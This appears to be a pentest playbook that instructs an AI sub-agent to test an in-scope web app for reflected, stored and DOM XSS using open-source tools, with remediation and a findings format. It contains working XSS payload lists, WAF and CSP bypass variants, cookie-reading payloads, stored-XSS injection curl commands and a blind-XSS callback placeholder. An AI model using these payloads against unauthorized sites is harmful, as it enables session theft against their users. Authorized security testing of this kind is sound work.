# Testing for XSS vulnerabilities (OSS workflow)

> OSS port of mukul975's `testing-for-xss-vulnerabilities-with-burpsuite` — the **hardest port** in the set because the original workflow is built around Burp Suite. Burp Scanner → OWASP ZAP + Dalfox; Repeater → ZAP Request tab; Intruder → ffuf / ZAP Fuzzer; embedded Chromium → standalone Chromium + FoxyProxy; **DOM Invader → no OSS equivalent (gap acknowledged honestly)**; Hackvertor → manual encoding snippets; XSS Hunter → self-hosted BlindXSS fork or skip.

## Sub-agent mission

You are dispatched to test a target web app for reflected, stored, and DOM XSS. You drive an OSS workflow: OWASP ZAP (crawl + active scan), Dalfox (payload injection), ffuf (intruder-equivalent), and **manual** DOM source/sink analysis (because no OSS tool does what Burp DOM Invader does). Report findings with severity, evidence, the XSS class, and the matching defensive plugin (`xss-prevention`).

## Inputs

- **task:** the user's verbatim request (e.g. "my Next.js app at localhost:3000 has a search box — check it for XSS").
- **target / scope:** base URL + in-scope routes. Confirmed by the orchestrator's gate (or localhost/dev = owned).
- **ack_state:** `confirmed` for live-target; `n/a` for static source review.
- **context (optional):** framework, known reflection points, sample user input.

## Tools

```bash
# Install (documentation only)
brew install zap-studio           # OWASP ZAP desktop
go install github.com/hahwul/dalfox/v2@latest
brew install ffuf
# Standalone Chromium / Firefox + FoxyProxy (replaces Burp's embedded browser)
# Python for encoding helpers (replaces Hackvertor)
```

For the full paid→OSS swap table, `SEE: references/oss-tool-map.md`. **The single biggest OSS gap is DOM Invader** — see Step 5 for the honest fallback.

## Methodology

### Step 1 — Configure tooling and map the app

```bash
# Start ZAP in daemon mode and spider the target
zap-cli start
zap-cli spider https://TARGET/
zap-cli -v urls > urls.txt

# Active scan (replaces Burp Scanner active crawl + injection)
zap-cli active-scan https://TARGET/
```

Capture the app's structure: routes, params, reflection points. Set FoxyProxy to point at ZAP (default `localhost:8080`) for browser-driven testing.

### Step 2 — Identify reflection points

For each form param and query param, identify whether user input is reflected and in what context (HTML, attribute, JavaScript, URL). Use the ZAP Request tab (replaces Burp Repeater):

```bash
# Probe reflection
PARAMS="q search name comment email redirect"
for p in $PARAMS; do
  echo "==> param=$p"
  curl -sk -G https://TARGET/ \
       --data-urlencode "$p=zzxxyyREFLECTzzxxyy" \
       | grep -o "zzxxyyREFLECTzzxxyy" | head -1 && echo "REFLECTED in body" || echo "not reflected"
done
```

Tag each reflection point with its context (HTML body / attribute / script block / URL).

### Step 3 — Test reflected XSS

Use Dalfox for high-volume payload injection (replaces Burp Intruder + Scanner):

```bash
# Dalfox with a single reflection point
dalfox url "https://TARGET/search?q=FUZZ" \
       --parameters "q" \
       --blind "https://INTERACT_SH_DOMAIN" \
       --output dalfox-reflected.txt

# Or ffuf for context-specific payloads with pattern-match
ffuf -u "https://TARGET/search?q=FUZZ" \
     -w ~/xss-payloads.txt \
     -mr "alert(1)" \
     -t 20 \
     -o ffuf-xss.json -of json
```

**Context-specific payload selection** (the core of XSS testing — different contexts need different payloads):

#### HTML body context

```text
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg><script>alert(1)</script>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

#### HTML attribute context

```text
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
'><script>alert(1)</script>
" onfocus="alert(1)" autofocus="
javascript:alert(1)   <!-- for href/src attributes -->
```

#### JavaScript context (string)

```text
';alert(1);//
"-alert(1)-"
</script><script>alert(1)</script>
```

#### JavaScript context (template literals)

```text
${alert(1)}
${alert(document.cookie)}
```

#### URL context (href/src)

```text
javascript:alert(1)
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>
```

### Step 4 — Test stored XSS

Submit payloads via forms / APIs and observe whether they execute when the stored content is later rendered:

```bash
# Submit payload to a comment endpoint
PAYLOAD='<svg onload=alert(document.cookie)>'
curl -sk -X POST https://TARGET/api/comments \
     -H "Content-Type: application/json" \
     -H "Cookie: session=$SESSION" \
     --data "{\"body\":\"$PAYLOAD\"}"

# Fetch the rendered comment and check for execution
curl -sk https://TARGET/comments/123 | grep -i "svg onload"
```

Confirm with a browser — fetch the rendered page and verify the payload fires (DevTools console or DOM inspection). For high-throughput stored-XSS scanning, use Dalfox in `--mining-mode` to discover form-submit endpoints automatically.

### Step 5 — Test DOM XSS (the OSS gap)

> **Honest gap:** there is no OSS tool that does what Burp DOM Invader does (automatic client-side taint tracking with source/sink reachability). The OSS workflow is: static grep of JS for sinks, manual source→sink analysis, manual URL crafting, browser DevTools for verification.

#### DOM sources (where untrusted data enters)

```text
location.hash             (URL fragment)
location.search           (query string)
location.href             (full URL)
document.referrer         (referer header)
document.url              (URL)
window.name               (cross-page data)
postMessage               (cross-origin messages)
document.cookie           (cookies, rarely a source for DOM XSS but possible)
```

#### DOM sinks (where untrusted data executes)

```text
innerHTML / outerHTML     (HTML parsing)
document.write / writeln  (full document parse)
eval / Function / setTimeout(string) / setInterval(string)   (JS eval)
insertAdjacentHTML        (HTML parsing)
element.setAttribute('href'|'src', ...)   (URL context)
jQuery: $(html), $.html(), $.append(html), $.parseHTML
Angular: bypassSecurityTrustHtml / DomSanitizer
React: dangerouslySetInnerHTML
```

#### Static grep (replaces DOM Invader's taint tracking)

```bash
# Grep a directory of client-side JS for sinks (manual source/sink analysis)
grep -rEn "innerHTML|outerHTML|document\.write|document\.writeln|\beval\(|new Function\(|setTimeout\(\s*['\"]|setInterval\(\s*['\"]|insertAdjacentHTML" src/ public/ static/

# Grep for sources
grep -rEn "location\.(hash|search|href)|document\.(referrer|url)|window\.name|postMessage|addEventListener\(\s*['\"]message" src/ public/ static/

# Combined helper script (save as scripts/dom-xss-grep.sh)
```

A finding requires that a **source flows into a sink** without sanitization. Manual trace: read the JS, follow the data path from source to sink, verify there is no `encodeURIComponent`, `textContent`, `DOMPurify.sanitize`, or equivalent in between.

#### Manual PoC

Once a source→sink path is identified, craft a URL that delivers a payload through the source to the sink:

```bash
# Example: app uses location.hash in innerHTML of a "share" div
# Sink: div.innerHTML = "Share this: " + decodedHash
# PoC URL:
echo "https://TARGET/page#<img src=x onerror=alert(document.cookie)>"
```

Open in a browser; verify the payload executes.

#### ZAP DOM XSS add-on (limited)

ZAP has a DOM XSS add-on that provides partial automated coverage. Enable it, but treat results as a hint, not ground truth — it does not match DOM Invader's reachability analysis.

```bash
zap-cli script enable "DOM XSS"
zap-cli active-scan https://TARGET/
```

### Step 6 — Bypass filters and CSP

#### WAF / filter bypass payloads

```text
<img src=x onerror=alert(1)>                    # baseline
<Img src=x oNeRrOr=alert(1)>                    # case variation
<img src=x onerror="alert(1)">                  # quoted
<img src=x onerror=a%6Cert(1)>                  # mid-token encoding
<svg/onload=alert(1)>                           # slash separator
<svg><script>alert(1)</script></svg>            # nested
<script>alert(1)//</script>                      # comment trick
%3Cscript%3Ealert(1)%3C%2Fscript%3E              # URL-encoded
\u003Cscript\u003Ealert(1)\u003C/script\u003E    # unicode-escaped (JS context)
```

#### CSP bypass — payload encoding helpers (replaces Hackvertor)

Use Python one-liners for the encodings Hackvertor provided as tags:

```bash
# URL-encode
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"

# HTML-entity encode (decimal)
python3 -c "import html; print(''.join(f'&#{ord(c)};' for c in '<script>alert(1)</script>'))"

# Base64 (for data: URIs)
python3 -c "import base64; print(base64.b64encode(b'<script>alert(1)</script>').decode())"

# JS string-escape
python3 -c "print('<script>alert(1)</script>'.encode('unicode_escape').decode())"
```

#### CSP-bypass cheat sheet (gadgets)

If the app has a restrictive CSP, look for bypass gadgets:

- **`script-src 'self'`** + JSONP endpoint: `https://TARGET/api/jsonp?callback=alert(1)//`
- **`script-src cdn.jsdelivr.net`** (or similar wide CDN): use a JS file on the CDN that calls eval on a param.
- **`script-src 'unsafe-inline'`**: trivially bypassed (CSP is meaningless).
- **`script-src 'nonce-XXX'`** + nonce reflection in a param: inject `<script nonce="XXX">`.
- Google's CSP Evaluator: https://csp-evaluator.withgoogle.com/ — paste the policy to find bypasses.

### Step 7 — Validate and document

For each candidate finding:

1. **Verify execution in a real browser.** `curl`-visible reflection is not execution. Open the URL in Chromium/Firefox with DevTools open and confirm the `alert` (or whatever the sink is) fires.
2. **Capture evidence.** Screenshot or console output showing execution.
3. **Document the context.** HTML body / attribute / script / URL.
4. **Document the payload.** The exact payload that fired.
5. **Document the bypass.** If a filter/WAF/CSP was bypassed, document how.
6. **Severity scoring.** Reflected XSS in a public form (no auth) → high. Stored XSS executed by an admin viewing user content → critical (privilege escalation). DOM XSS requiring user click → medium.

## Common mistakes

- **Reporting reflection without execution.** Reflection is necessary but not sufficient. Verify execution in a browser.
- **Using HTML-body payloads in attribute contexts.** The payload must match the context. Use the context-specific lists above.
- **Skipping DOM XSS.** It's the hardest to test without DOM Invader, but ignoring it leaves real bugs. Do the manual source/sink analysis in Step 5.
- **Reporting stored XSS without verifying render-side execution.** Submit + check the rendered HTML — the server may sanitize on read even if it didn't sanitize on write.
- **Treating CSP as a defense.** Most CSPs are bypassable. Test the bypass matrix; don't assume CSP = safe.

## Quick reference — XSS classes

| Class | Where the payload lives | Severity range |
|---|---|---|
| Reflected | URL param, echoed in response | medium (high if unauth) |
| Stored | Database, rendered later for victim(s) | high → critical (admin viewer) |
| DOM | URL fragment / source → JS sink (no server round-trip) | medium → high |
| Blind | Triggered on an admin panel the tester can't see | high (use self-hosted BlindXSS) |

## OWASP / MITRE references

- **OWASP A03:2021** — Injection (XSS is a sub-class).
- **MITRE ATT&CK** — T1190 (Exploit Public-Facing Application), T1059.007 (JavaScript), T1505.003 (Web Shell), T1083.

## Parity gap statement (be honest)

**DOM Invader has no OSS equivalent.** DOM Invader performs automatic client-side taint tracking with source/sink reachability analysis. The OSS workflow replaces it with: static `grep` of JS for sinks, manual source→sink tracing, manual URL crafting, and browser DevTools for verification. This is more labor-intensive and easier to miss. State this gap to the user plainly — do not pretend the OSS workflow matches DOM Invader's coverage.

For the rest of the workflow (Scanner / Repeater / Intruder / Hackvertor / XSS Hunter), OSS tools (ZAP / ZAP Request / ffuf / Python encoding / self-hosted BlindXSS) provide functionally equivalent coverage with acceptable trade-offs. `SEE: references/oss-tool-map.md`.

## Remediation

`SEE: references/defensive-cross-refs.md`. **Primary match: `xss-prevention`** (input sanitization, output encoding, CSP-for-XSS patterns).

## Sub-agent return contract

```json
{
  "findings": [
    {
      "vuln": "Reflected XSS in /search?q=",
      "class": "reflected | stored | dom | blind",
      "context": "html-body | html-attr | js-string | js-template | url",
      "severity": "high",
      "cvss": "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N (7.4 High)",
      "owasp": "A03:2021",
      "mitre": ["T1190", "T1059.007"],
      "payload": "<svg onload=alert(document.cookie)>",
      "evidence": "Browser console showed 'alert' dialog when visiting https://TARGET/search?q=%3Csvg%20onload%3Dalert(document.cookie)%3E",
      "csp_bypass": "none | <gadget used>",
      "remediation": "Context-aware output encoding (HTML-encode for HTML body, attr-encode for attributes, JS-escape for JS contexts). Use a library like DOMPurify for HTML inputs. Enforce a strict CSP without 'unsafe-inline'.",
      "defensive_plugin": "xss-prevention"
    }
  ],
  "dom_invader_gap_acknowledged": true,
  "reflection_points": 12,
  "summary": "Found 1 reflected XSS (high) and 1 stored XSS (critical). DOM XSS manually analyzed — no source→sink paths found, but coverage is limited by the OSS DOM-Invader gap."
}
```
